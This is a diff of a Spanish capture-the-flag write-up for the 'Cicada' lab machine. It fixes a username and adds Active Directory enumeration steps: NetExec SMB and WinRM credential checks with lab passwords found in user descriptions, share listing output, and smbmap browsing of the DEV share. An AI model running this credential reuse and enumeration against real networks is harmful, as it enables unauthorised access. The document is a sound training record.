@@ -191,19 +191,36 @@ También podemos enumerar las descripciones de los usuarios con `querydispinfo`
 También podemos listar las descripciones de los usuarios con
 `nxc smb 10.129.231.149 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users`
 
-Vemos que el usuario `david.orelius` tiene como password `aRt$Lp#7t*VQ!3` ya que lo tiene apuntado en su descripción
+Vemos que el usuario `david.orelious` tiene como password `aRt$Lp#7t*VQ!3` ya que lo tiene apuntado en su descripción
 
 Verificamos que las credenciales son validas
-`nxc smb 10.129.231.149 -u 'david.orelius' -p 'aRt$Lp#7t*VQ!3'`
+`nxc smb 10.129.231.149 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3'`
 
 ```ad-hint
 david.orelious::aRt$Lp#7t*VQ!3
 ```
 
 También podemos ver si pertenece a remote managemets
-`nxc winrm 10.129.231.149 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'`
+`nxc winrm 10.129.231.149 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3'`
 
 Listaremos los recursos compartidos de este usuario
+`nxc smb 10.129.231.149 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares`
+
+Vemos que tenemos permisos de lectura sobre `DEV`
+```txt
+Share           Permissions     Remark
+-----           -----------     ------
+ADMIN$                          Remote Admin
+C$                              Default share
+DEV             READ            
+HR              READ            
+IPC$            READ            Remote IPC
+NETLOGON        READ            Logon server share
+SYSVOL          READ            Logon server share
+```
+
+Listaremos los recursos compartidos de dentro de `DEV`
+`smbmap -H 10.129.231.149 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' -r DEV`
 
 
 
